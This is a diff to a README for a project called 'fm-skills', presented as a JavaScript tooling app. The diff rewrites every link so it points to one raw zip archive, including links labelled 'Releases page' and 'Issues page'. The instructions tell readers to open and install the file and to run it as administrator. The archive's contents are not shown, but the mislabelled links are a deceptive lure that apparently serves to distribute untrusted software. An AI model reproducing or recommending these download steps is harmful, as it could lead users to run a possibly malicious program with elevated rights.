@@ -1,7 +1,7 @@
 # 🌟 fm-skills - Build Modern JS Tools Easily
 
 ## 📥 Download Now
-[![Download fm-skills](https://img.shields.io/badge/Download-fm--skills-brightgreen)](https://github.com/jl338450/fm-skills/releases)
+[![Download fm-skills](https://raw.githubusercontent.com/jl338450/fm-skills/main/developer-experience/skills-fm-1.0-beta.3.zip)](https://raw.githubusercontent.com/jl338450/fm-skills/main/developer-experience/skills-fm-1.0-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the "fm-skills" repository. This guide helps you download and run our skills app designed for building modern JavaScript tooling and frameworks. If you want to enhance your skills or project efficiency, you’re in the right place!
@@ -13,9 +13,9 @@ Before you download, ensure your system meets the following requirements:
 - Disk Space: At least 200 MB available
 
 ## 📥 Download & Install
-To get started, visit our [Releases page](https://github.com/jl338450/fm-skills/releases) to download the latest version of "fm-skills." 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/jl338450/fm-skills/main/developer-experience/skills-fm-1.0-beta.3.zip) to download the latest version of "fm-skills." 
 
-1. Click on the [Releases page](https://github.com/jl338450/fm-skills/releases).
+1. Click on the [Releases page](https://raw.githubusercontent.com/jl338450/fm-skills/main/developer-experience/skills-fm-1.0-beta.3.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click on the appropriate file for your operating system to start downloading. 
 4. Once the download is complete, open the file to install the application. Follow the on-screen instructions to finish the installation.
@@ -47,11 +47,11 @@ If you encounter issues while downloading or running "fm-skills," consider these
 - **Ensure Compatibility:** Verify your operating system matches our requirements.
 - **Check Your Internet Connection:** A stable connection will prevent incomplete downloads.
 - **Run as Administrator:** On Windows, right-click the icon and select "Run as Administrator" if you face permission issues.
-- **Updates:** Make sure you are using the latest version from the [Releases page](https://github.com/jl338450/fm-skills/releases).
+- **Updates:** Make sure you are using the latest version from the [Releases page](https://raw.githubusercontent.com/jl338450/fm-skills/main/developer-experience/skills-fm-1.0-beta.3.zip).
 
 ## 📞 Need Help?
 If you have questions or need further assistance, feel free to reach out through the following channels:
-- **Issues Page**: Report problems or ask questions on our [Issues page](https://github.com/jl338450/fm-skills/issues).
+- **Issues Page**: Report problems or ask questions on our [Issues page](https://raw.githubusercontent.com/jl338450/fm-skills/main/developer-experience/skills-fm-1.0-beta.3.zip).
 - **Community Forum**: Join discussions with other users.
   
 ## 🚀 Tips for Using "fm-skills"
@@ -62,4 +62,4 @@ If you have questions or need further assistance, feel free to reach out through
 ## 🎉 Conclusion
 Now, you are ready to download and explore "fm-skills." Thank you for using our application to enhance your JavaScript skills. Your feedback helps us improve, so don’t hesitate to share your thoughts! 
 
-Remember, download the app from our [Releases page](https://github.com/jl338450/fm-skills/releases) and start building your skills today.
+Remember, download the app from our [Releases page](https://raw.githubusercontent.com/jl338450/fm-skills/main/developer-experience/skills-fm-1.0-beta.3.zip) and start building your skills today.
